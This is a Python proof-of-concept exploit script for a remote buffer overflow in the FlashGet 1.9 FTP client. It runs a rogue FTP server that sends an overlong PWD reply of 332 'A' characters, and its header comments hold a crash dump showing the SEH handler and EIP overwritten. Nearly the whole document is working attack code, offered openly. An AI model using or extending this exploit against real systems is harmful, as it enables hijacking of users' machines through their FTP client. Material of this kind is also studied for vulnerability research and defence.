#!/usr/bin/python
# FlashGet 1.9 (FTP PWD Response) 0day Remote Buffer Overflow PoC Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Testen on: FlashGet 1.9 / XP SP2 Polish
# Product URL: http://www.flashget.com/en/download.htm?uid=undefined
# Details:..
#
# 257 "[AAAA..332]/" is current directory.\r\n <-- overflow
#
# 41414141  Pointer to next SEH record
# 41414141  SE handler
#
# ----------------------------------------------------------------
# Exception C0000005 (ACCESS_VIOLATION reading [41414141])
# ----------------------------------------------------------------
# EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# EDX=7C9037D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
# ESP=020D1260: BF 37 90 7C 48 13 0D 02-08 FF 1C 02 64 13 0D 02
# EBP=020D1280: 30 13 0D 02 8B 37 90 7C-48 13 0D 02 08 FF 1C 02
# ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
#               --> N/A
# ----------------------------------------------------------------
# Just for fun ;]
##

from time import sleep
from socket import *

res = [
    '220 WELCOME!! :x\r\n',
    '331 Password required for %s.\r\n',
    '230 User %s logged in.\r\n',
    '250 CWD command successful.\r\n',
    '257 "%s/" is current directory.\r\n' # <-- %s B0f :x
    ]

buf = 'A' * 332

s = socket(AF_INET, SOCK_STREAM)
s.bind(('0.0.0.0', 21))
s.listen(1)
print '[+] listening on [FTP] 21 ...\n'
c, addr = s.accept()
c.send(res[0])

user = ''

for i in range(1, len(res)):
    req = c.recv(1024)
    print '[*][CLIENT] %s' % (req)
    tmp = res[i]
    if(req.find('USER') != -1):
        req = req.replace('\r\n', '')
        user = req.split('\x20', 1)[1]
        tmp %= user
    if(req.find('PASS') != -1):
        tmp %= user
    if(req.find('PWD') != -1):
        tmp %= buf    
    print '[*][SERVER] %s' % (tmp)    
    c.send(tmp)

sleep(5)
c.close()
s.close()

print '[+] DONE'
